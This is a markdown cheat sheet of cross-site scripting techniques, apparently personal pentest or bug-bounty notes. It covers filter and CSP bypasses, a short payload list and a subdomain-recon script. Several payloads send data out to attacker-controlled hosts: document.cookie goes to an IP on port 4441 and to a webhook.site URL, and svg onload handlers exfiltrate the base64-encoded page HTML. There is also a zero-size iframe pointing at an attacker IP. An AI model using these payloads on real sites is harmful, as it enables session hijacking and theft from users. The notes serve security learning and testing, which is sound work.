## Cheat sheet

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet


---

## Recognition

1. Figure out where it goes. Does it get embedded in a tag attribute ? into a string in a script tag ?
2. Figure out any special handling : Do URLs get turned into links ?
3. Figure out how special characters are handled : Try these `1234```'<>:;"'`

- From those 3 steps, you'll know whether or not a givin input is vulnerable to XSS.
r(reflected)XSS are dependent on CSRF vulnerabilities to be exploitable, in the case of POST. If rXSS in GET, you are dependent on CSRF otherwise.

- Example 1 : Testing character, angle brackets ```<>``` are passed through without encoding
and text is shown in a text node of the document. Here a simple ```<script>alert("XSS");</script>``` will work.

- Example 2 : THe input is reflected in a tag attribute. You have to break out of the attribute, but in most cases you don't need to leave the tag; meaning no need for angle brackets.

--- 

## Encoding is done using HTML-encoding

- Named : `<` equal `&lt`, `>` equals `&gt;`, `"` equals `&quot;`, `&` equals `&amp;`
- Hex : use `man ascii`, for ex `'` is `0x27` equals `&#x27;`. Same principle for the others.
- Decimal : use `man ascii`, for ex `<` is `60` equals `&#60`, same principle for the others.

---

## Try playing with uppercase and lowercase

---

## Sometimes, it's not filtered recursively :

`https://example.com/test.php?arg=<scr<script>ipt>alert('1')</scr</script>ipt>`

---

## Script word is blocked

- with the `<a` tag and for the following events: `onmouseover` (you will need to pass your mouse over the link), `onmouseout, onmousemove, onclick` ...

- with the `<a` tag directly in the URL: `<a href='javascript:alert(1)'...` (you will need to click the link to trigger the JavaScript code and remember that this won't work since you cannot use script in this example).

- with the `<img` tag directly with the event onerror: `<img src='zzzz' onerror='alert(1)' />`.

- with the `<div` tag and for the following events: `onmouseover` (you will need to pass your mouse over the link), `onmouseout, onmousemove, onclick`...
...

---

## Alert() is blocked

Use console.log or eval and stringfromcharcode

- Encode alert(1) in decimal : 97 108 101 114 116 40 49 41 

---

## Used inside a var

escape from it (generally with a `"`), add `;`, write your code and comment the end with `\\` or add another variable `var $dummy = "`

---

## Don't check just the field box, check also by adding stuff in the url

For example, you found an input field but the characters are encoded. Viewing the page source, and adding stuff at the end of the url, you see that it's reflected in the page source : `/index.php/tezfzefze` is inside the page source. Try to inject your stuff here too !

---

## Short cheat sheet 

```
"><h1>test</h1>"
'+alert(1)+'
"onmouseover="alert(1)
http://"onmouseover="alert(1)
```
If one of these work, you just have to find the good one !

---


## With an iframe , it's possible to get same result but in a stealthier manner :

```<iframe SRC="http://10.11.0.156:81/report" height = “0” width = “0”></iframe>```


---

## Steal the cookies :

```<script>new Image().src="http://10.11.0.156:4441/bogus.php?output="%2Bdocument.cookie;</script>```

```
<script>document.write("<img src='https://webhook.site/ae4ca108-7f0c-4ae2-98d7-e47976330ad1?test="+document.cookie+"'></img>");</script>
```

---

## TOOL TO TEST 

https://github.com/Damian89/extended-xss-search

---

## Check how it is reflected

- Any weird character ? Encoded ? Double encoded ? 


---

## Bypass CSP

- Check the header content-security-policy (burp or dev tools)
- Copy paste the url or the header into https://csp-evaluator.withgoogle.com/
- Don't bother with the warning about object-src, too old thing.


### default-src 

- means that it will only execute javascript from the server. So here, use the javascript at your disposal from the server.

-  To solve it : according to the documentation, the srcdoc attribute overrides the src attribute and specifies the HTML content to show inside the iframe. But most importantly, the iframe with the srcdoc attribute is not cross domain, meaning that the content will be treated as coming from the same domain as the parent-page. 

```<iframe srcdoc="<script src=...></script>"></iframe>```

Example from the intigriti easter xss challenge : ```<iframe srcdoc="<script src=https://challenge.intigriti.io/'-alert(document.domain)-'></script>"></iframe>```

### Resources :
https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/
https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2019/april/a-novel-csp-bypass-using-data-uri/


### Simple XSS Check

By @TobiunddasMoe


```
#!/bin/bash
# $1 => example.domain

subfinder -d $1 -o domains_subfinder_$1
amass enum --passive -d $1 -o domains_$1

cat domains_subfinder_$1 | tee -a domain_$1
cat domains_$1 | filter-resolved | tee -a domains_$1.txt

cat domains_$1.txt | ~/go/bin/httprobe -p http:81 -p http:8080 -p https:8443 | waybackurls | kxss | tee xss.txt

```

### Prove impact easily

- ```xsscope```

---

## exfiltrate content without script tag  


use webhook.site, and replace the url inside

```
<svg onload="window.location.href = '//webhook.site/ae4ca108-7f0c-4ae2-98d7-e47976330ad1?c='+btoa(document.documentElement.innerHTML)">
```

Then go on webhook.site and wait for the cookie.

With img : 

```
<svg onload="new Image().src='//example.com/?x='+btoa(document.documentElement.innerHTML)">
```

